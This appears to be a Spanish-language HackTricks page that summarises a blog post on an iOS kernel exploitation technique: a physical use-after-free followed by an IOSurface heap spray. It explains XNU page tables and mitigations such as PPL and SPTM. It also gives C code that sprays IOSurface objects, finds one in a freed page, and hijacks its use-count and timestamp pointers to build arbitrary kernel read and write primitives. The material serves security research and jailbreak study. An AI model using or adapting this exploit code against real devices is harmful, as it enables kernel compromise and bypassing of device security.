# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Physical use-after-free

Este es un resumen del post en [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html). Además, más información sobre exploits que usan esta técnica puede encontrarse en [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

El espacio de direcciones de memoria virtual para procesos de usuario en iOS abarca desde 0x0 hasta 0x8000000000. Sin embargo, estas direcciones no se corresponden directamente con la memoria física. En su lugar, el kernel usa tablas de páginas para traducir direcciones virtuales a direcciones físicas reales.

#### Levels of Page Tables in iOS

Las tablas de páginas están organizadas jerárquicamente en tres niveles:

1. Tabla de páginas L1 (Level 1):
* Cada entrada aquí representa un rango grande de memoria virtual.
* Cubre 0x1000000000 bytes (o 256 GB) de memoria virtual.
2. Tabla de páginas L2 (Level 2):
* Una entrada aquí representa una región más pequeña de memoria virtual, específicamente 0x2000000 bytes (32 MB).
* Una entrada L1 puede apuntar a una tabla L2 si no puede mapear toda la región por sí misma.
3. Tabla de páginas L3 (Level 3):
* Este es el nivel más fino, donde cada entrada mapea una página de memoria de 4 KB.
* Una entrada L2 puede apuntar a una tabla L3 si se necesita un control más granular.

#### Mapping Virtual to Physical Memory

* Direct Mapping (Block Mapping):
* Algunas entradas en una tabla de páginas mapean directamente un rango de direcciones virtuales a un rango contiguo de direcciones físicas (como un atajo).
* Pointer to Child Page Table:
* Si se necesita mayor granularidad, una entrada en un nivel (por ejemplo, L1) puede apuntar a una tabla de páginas hija en el siguiente nivel (por ejemplo, L2).

#### Example: Mapping a Virtual Address

Imagina que intentas acceder a la dirección virtual 0x1000000000:

1. L1 Table:
* El kernel comprueba la entrada de la tabla L1 correspondiente a esa dirección virtual. Si tiene un pointer to an L2 page table, va a esa tabla L2.
2. L2 Table:
* El kernel comprueba la tabla L2 para un mapeo más detallado. Si esta entrada apunta a una L3 page table, procede allí.
3. L3 Table:
* El kernel consulta la entrada final L3, que apunta a la dirección física de la página de memoria real.

#### Example of Address Mapping

Si escribes la dirección física 0x800004000 en el primer índice de la tabla L2, entonces:

* Las direcciones virtuales desde 0x1000000000 hasta 0x1002000000 se mapean a direcciones físicas desde 0x800004000 hasta 0x802004000.
* Esto es un block mapping a nivel L2.

Alternativamente, si la entrada L2 apunta a una tabla L3:

* Cada página de 4 KB en el rango virtual 0x1000000000 -> 0x1002000000 sería mapeada por entradas individuales en la tabla L3.

### Physical use-after-free

Un Physical use-after-free (UAF) ocurre cuando:

1. Un proceso aloja (allocate) memoria como readable and writable.
2. Las page tables se actualizan para mapear esa memoria a una dirección física específica a la que el proceso puede acceder.
3. El proceso desaloca (free) la memoria.
4. Sin embargo, debido a un bug, el kernel se olvida de eliminar el mapping de las tablas de páginas, aunque marca la memoria física correspondiente como libre.
5. El kernel puede entonces reallocar esa memoria física "liberada" para otros propósitos, como datos del kernel.
6. Como el mapping no se eliminó, el proceso aún puede read y write a esa memoria física.

Esto significa que el proceso puede acceder a páginas de kernel memory, que podrían contener datos sensibles o estructuras, permitiendo potencialmente a un atacante manipular kernel memory.

### IOSurface Heap Spray

Dado que el atacante no puede controlar qué páginas del kernel serán asignadas a la memoria liberada, usa una técnica llamada heap spray:

1. El atacante crea un gran número de objetos IOSurface en kernel memory.
2. Cada objeto IOSurface contiene un valor mágico en uno de sus campos, lo que facilita su identificación.
3. Escanean las páginas liberadas para ver si alguno de estos objetos IOSurface cayó en una página liberada.
4. Cuando encuentran un objeto IOSurface en una página liberada, pueden usarlo para read and write kernel memory.

Más información sobre esto en [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Ten en cuenta que los dispositivos iOS 16+ (A12+) incorporan mitigaciones de hardware (como PPL o SPTM) que hacen que las técnicas de physical UAF sean mucho menos viables.
> PPL impone protecciones MMU estrictas en páginas relacionadas con code signing, entitlements y datos sensibles del kernel, por lo que, incluso si una página se reutiliza, los writes desde userland o código de kernel comprometido a páginas protegidas por PPL son bloqueados.
> Secure Page Table Monitor (SPTM) amplía PPL endureciendo las propias actualizaciones de page tables. Asegura que incluso el código privilegiado del kernel no pueda remapear silenciosamente páginas liberadas o manipular mappings sin pasar por comprobaciones seguras.
> KTRR (Kernel Text Read-Only Region), que bloquea la sección de código del kernel como read-only después del arranque. Esto evita modificaciones en tiempo de ejecución al código del kernel, cerrando una vía de ataque principal de la que dependen muchos exploits de physical UAF.
> Además, las asignaciones de IOSurface son menos predictibles y más difíciles de mapear en regiones accesibles por el usuario, lo que hace que el truco de "scanear por el valor mágico" sea mucho menos fiable. Y IOSurface ahora está protegido por entitlements y restricciones de sandbox.

### Step-by-Step Heap Spray Process

1. Spray IOSurface Objects: El atacante crea muchos objetos IOSurface con un identificador especial ("magic value").
2. Scan Freed Pages: Comprueban si alguno de los objetos ha sido asignado en una página liberada.
3. Read/Write Kernel Memory: Manipulando campos en el objeto IOSurface, obtienen la capacidad de realizar arbitrary reads and writes en kernel memory. Esto les permite:
* Usar un campo para read any 32-bit value en kernel memory.
* Usar otro campo para write 64-bit values, logrando una stable kernel read/write primitive.

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Buscar objetos **`IOSurface`** en una página física liberada:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Lograr Kernel Read/Write con IOSurface

Después de obtener control sobre un objeto IOSurface en la memoria del kernel (mapeado a una página física liberada accesible desde userspace), podemos usarlo para **arbitrary kernel read and write operations**.

**Campos clave en IOSurface**

El objeto IOSurface tiene dos campos cruciales:

1. **Use Count Pointer**: Permite un **32-bit read**.
2. **Indexed Timestamp Pointer**: Permite un **64-bit write**.

Al sobrescribir estos punteros, los redirigimos a direcciones arbitrarias en la memoria del kernel, habilitando capacidades de read/write.

#### Lectura Kernel de 32 bits

Para realizar una lectura:

1. Sobrescribe el **use count pointer** para que apunte a la dirección objetivo menos un offset de 0x14 bytes.
2. Usa el método `get_use_count` para leer el valor en esa dirección.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### Escritura en el kernel de 64 bits

Para realizar una escritura:

1. Sobrescribe el **indexed timestamp pointer** con la dirección objetivo.
2. Usa el método `set_indexed_timestamp` para escribir un valor de 64 bits.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Exploit Flow Recap

1. **Trigger Physical Use-After-Free**: Las páginas liberadas están disponibles para su reutilización.  
2. **Spray IOSurface Objects**: Asigna muchos objetos IOSurface con un "magic value" único en kernel memory.  
3. **Identify Accessible IOSurface**: Localiza un IOSurface en una página liberada que controlas.  
4. **Abuse Use-After-Free**: Modifica punteros en el objeto IOSurface para habilitar arbitrary **kernel read/write** vía los métodos de IOSurface.

Con estas primitivas, el exploit proporciona **lecturas de 32-bit** controladas y **escrituras de 64-bit** en kernel memory. Pasos adicionales de jailbreak podrían implicar primitivas de read/write más estables, que pueden requerir eludir protecciones adicionales (p. ej., PPL en dispositivos arm64e más recientes).

{{#include ../../banners/hacktricks-training.md}}
